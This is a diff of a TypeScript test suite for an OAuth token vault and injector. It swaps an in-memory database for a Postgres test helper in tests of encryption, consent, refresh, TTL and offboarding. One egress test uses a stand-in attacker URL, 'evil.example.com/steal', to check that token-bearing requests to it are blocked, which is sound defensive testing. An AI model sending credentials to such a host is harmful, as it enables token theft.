@@ -1,8 +1,8 @@
 import { test } from 'node:test';
+import { openTestDb } from './support/pg';
 import assert from 'node:assert/strict';
 import { randomBytes } from 'node:crypto';
 import { encrypt, decrypt, sha256base64url } from '../src/core/crypto';
-import { openDb } from '../src/core/db';
 import { Vault } from '../src/core/vault';
 import { Audit } from '../src/core/audit';
 import { Consent } from '../src/core/consent';
@@ -34,8 +34,8 @@ test('crypto: PKCE challenge is stable base64url', () => {
   assert.match(sha256base64url('abc'), /^[A-Za-z0-9_-]+$/);
 });
 
-test('vault: tokens are stored encrypted and round-trip by Slack identity', async () => {
-  const db = await openDb({ dbPath: ':memory:' });
+test('vault: tokens are stored encrypted and round-trip by Slack identity', async (t) => {
+  const db = await openTestDb(t);
   const vault = new Vault(db, KEY);
   assert.equal(await vault.get(O1, 'github'), null);
   await vault.upsert(O1, 'github', {
@@ -59,8 +59,8 @@ test('vault: tokens are stored encrypted and round-trip by Slack identity', asyn
   assert.equal(await vault.get(O1, 'github'), null);
 });
 
-test('consent: state is single-use and expires', async () => {
-  const db = await openDb({ dbPath: ':memory:' });
+test('consent: state is single-use and expires', async (t) => {
+  const db = await openTestDb(t);
   const consent = new Consent(db);
   const provider = github({ clientId: 'cid', clientSecret: 'csec' });
   const { state, authorizeUrl } = await consent.begin(ID, provider, 'https://x/cb', 'C1');
@@ -74,8 +74,8 @@ test('consent: state is single-use and expires', async () => {
   assert.equal(await consent.consume(state), null);
 });
 
-test('providers: ANY OAuth2 provider works via generic defineProvider', async () => {
-  const db = await openDb({ dbPath: ':memory:' });
+test('providers: ANY OAuth2 provider works via generic defineProvider', async (t) => {
+  const db = await openTestDb(t);
   const consent = new Consent(db);
   // A provider Vouchr ships nothing for, defined in ~10 lines by the user.
   const acme = defineProvider({
@@ -169,8 +169,8 @@ test('tokens: provider-supplied OAuth error text is not propagated', async () =>
   }
 });
 
-test('injector: egress allowlist blocks disallowed hosts before any token use', async () => {
-  const db = await openDb({ dbPath: ':memory:' });
+test('injector: egress allowlist blocks disallowed hosts before any token use', async (t) => {
+  const db = await openTestDb(t);
   const vault = new Vault(db, KEY);
   const audit = new Audit(db);
   const provider = github({ clientId: 'cid', clientSecret: 'csec' });
@@ -185,8 +185,8 @@ test('injector: egress allowlist blocks disallowed hosts before any token use', 
   await assert.rejects(() => handle.fetch('https://evil.example.com/steal'), /Egress blocked/);
 });
 
-test('injector: blocks cleartext http to an allowlisted host (no bearer over the wire)', async () => {
-  const db = await openDb({ dbPath: ':memory:' });
+test('injector: blocks cleartext http to an allowlisted host (no bearer over the wire)', async (t) => {
+  const db = await openTestDb(t);
   const vault = new Vault(db, KEY);
   const audit = new Audit(db);
   const provider = github({ clientId: 'cid', clientSecret: 'csec' }); // egressAllow includes api.github.com
@@ -195,8 +195,8 @@ test('injector: blocks cleartext http to an allowlisted host (no bearer over the
   await assert.rejects(() => handle.fetch('http://api.github.com/user'), /requires https/);
 });
 
-test('injector: concurrent fetches share a single token refresh (no rotating-token brick)', async () => {
-  const db = await openDb({ dbPath: ':memory:' });
+test('injector: concurrent fetches share a single token refresh (no rotating-token brick)', async (t) => {
+  const db = await openTestDb(t);
   const vault = new Vault(db, KEY);
   const audit = new Audit(db);
   const provider = defineProvider({
@@ -231,8 +231,8 @@ test('injector: concurrent fetches share a single token refresh (no rotating-tok
   }
 });
 
-test('injector: refreshes on 401, retries with the new token, and persists it', async () => {
-  const db = await openDb({ dbPath: ':memory:' });
+test('injector: refreshes on 401, retries with the new token, and persists it', async (t) => {
+  const db = await openTestDb(t);
   const vault = new Vault(db, KEY);
   const audit = new Audit(db);
   const provider = defineProvider({
@@ -284,11 +284,11 @@ test('injector: refreshes on 401, retries with the new token, and persists it', 
   }
 });
 
-test('injector: an audit failure during refresh does NOT roll back or fail the rotation', async () => {
+test('injector: an audit failure during refresh does NOT roll back or fail the rotation', async (t) => {
   // The provider consumes (rotates) the old refresh token during /token, so audit must run AFTER the
   // refresh commits and be best-effort — otherwise a thrown audit write would undo the stored new
   // token and leave us holding an already-invalidated refresh token (bricked connection).
-  const db = await openDb({ dbPath: ':memory:' });
+  const db = await openTestDb(t);
   const vault = new Vault(db, KEY);
   const brokenAudit = {
     record: async (action: string) => { if (action === 'refresh') throw new Error('audit sink down'); },
@@ -320,10 +320,10 @@ test('injector: an audit failure during refresh does NOT roll back or fail the r
   }
 });
 
-test('injector: the /token refresh fetch is given a bounded (10s) abort signal', async () => {
+test('injector: the /token refresh fetch is given a bounded (10s) abort signal', async (t) => {
   // A refresh runs while holding the advisory lock + refresh-pool connection; without a timeout a hung
   // /token endpoint would pin both. Assert the signal is armed (~10s) — captured, not waited on.
-  const db = await openDb({ dbPath: ':memory:' });
+  const db = await openTestDb(t);
   const vault = new Vault(db, KEY);
   const audit = new Audit(db);
   const provider = defineProvider({
@@ -355,8 +355,8 @@ test('injector: the /token refresh fetch is given a bounded (10s) abort signal',
   }
 });
 
-test('vault: list returns a user\'s connected providers, isolated per identity', async () => {
-  const db = await openDb({ dbPath: ':memory:' });
+test('vault: list returns a user\'s connected providers, isolated per identity', async (t) => {
+  const db = await openTestDb(t);
   const vault = new Vault(db, KEY);
   await vault.upsert(O1, 'github', { accessToken: 'a', refreshToken: null, scopes: '', expiresAt: null, externalAccount: 'octocat' });
   await vault.upsert(O1, 'google', { accessToken: 'b', refreshToken: null, scopes: '', expiresAt: null, externalAccount: 'me@x.com' });
@@ -368,9 +368,9 @@ test('vault: list returns a user\'s connected providers, isolated per identity',
 
 const FRESH = { accessToken: 't', refreshToken: null, scopes: '', expiresAt: null, externalAccount: null };
 
-test('vault TTL: idle and max-age expiry; touch resets idle; empty policy never expires', async () => {
+test('vault TTL: idle and max-age expiry; touch resets idle; empty policy never expires', async (t) => {
   // idle timeout
-  const db1 = await openDb({ dbPath: ':memory:' });
+  const db1 = await openTestDb(t);
   const idleVault = new Vault(db1, KEY, { idleMs: 1000 });
   await idleVault.upsert(O1, 'github', FRESH);
   assert.ok(await idleVault.get(O1, 'github')); // fresh
@@ -380,22 +380,22 @@ test('vault TTL: idle and max-age expiry; touch resets idle; empty policy never 
   assert.ok(await idleVault.get(O1, 'github')); // touch reset the idle clock
 
   // absolute max-age (expires even if recently used)
-  const db2 = await openDb({ dbPath: ':memory:' });
+  const db2 = await openTestDb(t);
   const ageVault = new Vault(db2, KEY, { maxAgeMs: 1000 });
   await ageVault.upsert(O1, 'github', FRESH);
   await db2.run('UPDATE connection SET created_at=? WHERE provider=?', [Date.now() - 5000, 'github']);
   assert.equal(await ageVault.get(O1, 'github'), null);
 
   // empty policy never expires
-  const db3 = await openDb({ dbPath: ':memory:' });
+  const db3 = await openTestDb(t);
   const noVault = new Vault(db3, KEY, {});
   await noVault.upsert(O1, 'github', FRESH);
   await db3.run('UPDATE connection SET created_at=?, last_used_at=? WHERE provider=?', [1, 1, 'github']);
   assert.ok(await noVault.get(O1, 'github'));
 });
 
-test('vault.updateTokens preserves created_at so refresh cannot defeat max-age TTL', async () => {
-  const db = await openDb({ dbPath: ':memory:' });
+test('vault.updateTokens preserves created_at so refresh cannot defeat max-age TTL', async (t) => {
+  const db = await openTestDb(t);
   const vault = new Vault(db, KEY, { maxAgeMs: 1000 });
   await vault.upsert(O1, 'github', FRESH);
   await db.run('UPDATE connection SET created_at=? WHERE provider=?', [Date.now() - 5000, 'github']);
@@ -404,8 +404,8 @@ test('vault.updateTokens preserves created_at so refresh cannot defeat max-age T
   assert.equal(await vault.get(O1, 'github'), null); // still max-age expired
 });
 
-test('sweepExpired deletes past-TTL connections and audits them', async () => {
-  const db = await openDb({ dbPath: ':memory:' });
+test('sweepExpired deletes past-TTL connections and audits them', async (t) => {
+  const db = await openTestDb(t);
   const vault = new Vault(db, KEY, { idleMs: 1000 });
   const audit = new Audit(db);
   const consent = new Consent(db);
@@ -418,8 +418,8 @@ test('sweepExpired deletes past-TTL connections and audits them', async () => {
 
 // #192: a reconnect between the sweep's snapshot and its delete must survive — the delete is
 // conditional on the row STILL being expired, and nothing is audited/notified for the fresh row.
-test('sweepExpired: a reconnect after the expiry snapshot survives the sweep (no delete, no audit, no event)', async () => {
-  const db = await openDb({ dbPath: ':memory:' });
+test('sweepExpired: a reconnect after the expiry snapshot survives the sweep (no delete, no audit, no event)', async (t) => {
+  const db = await openTestDb(t);
   const vault = new Vault(db, KEY, { idleMs: 1000 });
   const audit = new Audit(db);
   const consent = new Consent(db);
@@ -440,8 +440,8 @@ test('sweepExpired: a reconnect after the expiry snapshot survives the sweep (no
   assert.equal(events.filter((e) => e.type === 'expired').length, 0, 'no expired health event');
 });
 
-test('sweepExpired also clears abandoned consent requests', async () => {
-  const db = await openDb({ dbPath: ':memory:' });
+test('sweepExpired also clears abandoned consent requests', async (t) => {
+  const db = await openTestDb(t);
   const vault = new Vault(db, KEY, {});
   const audit = new Audit(db);
   const consent = new Consent(db);
@@ -451,8 +451,8 @@ test('sweepExpired also clears abandoned consent requests', async () => {
   assert.equal(await consent.consume(state), null); // gone
 });
 
-test('offboardUser removes connections + pending consent, idempotently, leaving others', async () => {
-  const db = await openDb({ dbPath: ':memory:' });
+test('offboardUser removes connections + pending consent, idempotently, leaving others', async (t) => {
+  const db = await openTestDb(t);
   const vault = new Vault(db, KEY);
   const audit = new Audit(db);
   const consent = new Consent(db);
